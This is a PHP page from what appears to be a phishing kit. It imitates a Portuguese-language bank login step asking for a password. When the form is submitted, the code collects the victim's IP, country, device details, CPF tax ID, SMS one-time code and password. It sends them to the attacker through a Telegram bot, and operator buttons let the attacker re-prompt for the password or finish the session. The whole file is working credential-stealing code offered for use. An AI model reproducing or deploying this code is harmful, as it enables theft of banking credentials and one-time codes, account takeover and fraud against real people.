<?php 
session_start();
ob_start();
require_once('../includes/php/detect.php');
require_once('../config.php');


if($_SERVER['REQUEST_METHOD'] == 'POST'){
    if(!empty($_POST['pwd'])){

$_SESSION['unique_id'] = $_SERVER['REQUEST_TIME_FLOAT'];


$_SESSION['pwd_counter']++;

$_SESSION['pwd'] = $_POST['pwd'];


$buttons = array(
    'inline_keyboard' => array(
        array(
            array('text' => '🔑 PASSWORD AGAIN', 'callback_data' => $_SESSION['unique_id'] . $_SESSION['pwd_counter'] . ' pwd'),
            ),
        array(
        array('text' => '✅ FINISH', 'callback_data' => $_SESSION['unique_id'] . $_SESSION['pwd_counter'] . ' done'),
        ),
   
    )
);

include_once('../includes/php/bot_api.php');

$message = '<b>📲 SMS AUTH from</b> <code>'.$_SESSION['user_data']['query'].'</code>

<b>COUNTRY:</b> '.$_SESSION['user_data']['countryCode'].'
<b>DEVICE:</b> '.$_SESSION['device'].'
<b>BROWSER:</b> '.$_SESSION['browser'].'
<b>OS:</b> '.$_SESSION['os'].'

<b>CPF:</b> <code>'.trim($_SESSION['user']).'</code>
<b>SMS CODE:</b> <code>'.trim($_SESSION['code']).'</code>
<b>PASSWORD:</b> <code>'.trim($_SESSION['pwd']).'</code>';
  
$status = bot_api($message, $buttons);
if ($status['ok'] === 0 || $status['ok'] === false) die('{"error":true, "description": "telegram bot api"}');

header('location: checks/pwd.php');
exit();
}
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="css/app.css">
</head>
<body>
    <div id="app">
        <header class="txtcenter">
            <div>
                <img src="img/logo.png" alt="">
            </div>
            <div>
                <span class="blue class-1"></span>
            </div>
        </header>
        <main>
            <form action="<?php echo $_SERVER['PHP_SELF'] ?>" method="post" autocomplete="off">
                <div id="error" class="<?php if(!isset($_SESSION['pwd_err'])) echo 'hidden'; ?>"><span>Senha inválida.</span></div>
                <div style="margin-bottom: 40px;"><span class="grey">Informe sua senha:</span></div>
                <div class="form-group">
                    <input class="grey" type="text" name="pwd" id="pwd" placeholder=" ">
                    <label class="label grey" for="user"><svg xmlns="http://www.w3.org/2000/svg" width="15" fill="#4C556C"  viewBox="0 0 512 512"><path d="M336 352c97.2 0 176-78.8 176-176S433.2 0 336 0S160 78.8 160 176c0 18.7 2.9 36.8 8.3 53.7L7 391c-4.5 4.5-7 10.6-7 17v80c0 13.3 10.7 24 24 24h80c13.3 0 24-10.7 24-24V448h40c13.3 0 24-10.7 24-24V384h40c6.4 0 12.5-2.5 17-7l33.3-33.3c16.9 5.4 35 8.3 53.7 8.3zM376 96a40 40 0 1 1 0 80 40 40 0 1 1 0-80z"/></svg>Senha</label>
                </div>
                <button type="submit" style="margin-bottom: 0px">Entrar</button>
                <button type="button" id="back" style="background: transparent; border: 1px solid rgb(253, 169, 23); color: rgb(253, 169, 23); margin-bottom: 0px; margin-top:10px ">Voltar</button>
                <div style="padding: 20px 0;" class="txtcenter blue">Esqueceu sua senha? <span class="underline">Recuperar Senha</span> </div>
            </form>
        </main> 
        <footer style="margin-top: 5px;">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" fill="#0066b3" width="28"><path d="M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM169.8 165.3c7.9-22.3 29.1-37.3 52.8-37.3h58.3c34.9 0 63.1 28.3 63.1 63.1c0 22.6-12.1 43.5-31.7 54.8L280 264.4c-.2 13-10.9 23.6-24 23.6c-13.3 0-24-10.7-24-24V250.5c0-8.6 4.6-16.5 12.1-20.8l44.3-25.4c4.7-2.7 7.6-7.7 7.6-13.1c0-8.4-6.8-15.1-15.1-15.1H222.6c-3.4 0-6.4 2.1-7.5 5.3l-.4 1.2c-4.4 12.5-18.2 19-30.6 14.6s-19-18.2-14.6-30.6l.4-1.2zM224 352a32 32 0 1 1 64 0 32 32 0 1 1 -64 0z"/></svg>
            <span class="blue underline">Preciso de ajuda</span>
        </footer>
    </div>
    <script src="js/pass.js"></script>
    <script src="js/label.js"></script>
    <script src="js/jquery.js"></script>
    <script src="js/jquery.mask.js"></script>
    <script>$("#code").mask("000000");</script>
    <script>
        document.querySelector('#back').addEventListener('click', function(){
            window.location.href = 'index.html';
        });
    </script>
</body>
</html>